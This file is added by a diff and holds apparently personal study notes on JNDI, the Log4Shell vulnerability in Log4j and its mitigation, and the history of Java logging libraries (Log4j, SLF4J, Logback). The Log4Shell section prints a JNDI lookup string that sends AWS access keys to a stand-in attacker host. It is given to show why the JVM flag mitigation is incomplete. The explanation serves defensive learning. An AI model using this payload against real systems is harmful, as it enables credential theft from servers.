@@ -1,0 +1,68 @@
+JNDI:
+-----------------
+
+Java Naming and Directory Interface- allows you to store java objects in a remote location and then serialize them (kind of streaming them) into JVM
+
+JNDI lookups in Log4j is introduced - to have centralized configuration
+
+Example: logger.error("Look up value and inserts: {}","${jndi:ldap//...}");
+or fetch some env variables
+
+Log4j Vulnerability: Log4Shell : Remote code execution(RCE):
+-------------------------------------------------------------
+
+Can put the remote malacious jndi url in log4j
+
+logger.error("Look up value and inserts: {}","${jndi:ldap//malacious server}");
+Log4j calls that jndi and passes serialized malacious object which can be injected into out JVM. It can instatiate any other objects we might not know.
+
+
+Mitigation & Remidition:
+--------------------------------------------------------------
+set below JVM flags to false:
+com.sun.jndi.ldap.object.trustURLCodebase
+com.sun.jndi.rmi.object.trustURLCodebase
+
+This ensure not to trust the returned serialized malacious object. But the call to external party will happen. which might contain env variables.
+Example: ${jndi:ldap://evil.attacker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}
+
+This call will happen to malacious server where our credials gets exposed , even the object returned is not trusted by our JVM.
+
+This can be remidiated using latest version of log4j- 2.16 /  Ptach class directly/ Gradle constraints dependencies.
+
+
+Log4j vs slf4j vs Logback:
+-----------------------------------
+
+without any common logging frameworks, jdk used to support certain features.
+Log Levels : info, severe, fine,/.......
+Handlers - Console handler(prints into console), File Handler(logs into file).....
+
+Oldest Library - Log4j::
+--------------
+ Levels : debug, info, error
+ Appenders: File, console, rolling file(daily), jdbc, smtp, jms
+ Formatting options
+ 
+After log4j, if user wanted to use both log4j feature and jvm provided logging, they have to switch to call those libraries, got a need to design a facade library to call those fetaures----|
+			|
+			v
+Facade Libraries  - Apache Commons-SLG4J:
+----------------------------------------
+ The Simple Logging Facade for Java (SLF4J) serves as a simple facade or abstraction1 for various logging frameworks (e.g. java.util.logging, logback, log4j) allowing the end user to plug in the desired logging framework at deployment time.
+ 
+ 
+It only has interfcaes and depend on other libraries for functionalities
+
+our code --> SLF4J jar --> Log4j jar
+
+SLF4j wrapper internally calls logging libraries. SLf4j acts as API
+
+
+Logback and Log4j2(New):
+---------------------
+these also supports slf4j and also have advanced features on top of log4j.
+
+Logback is slightly popular
+Log4j2 has slightly better features - Lazy Loading messages/Async logging
+
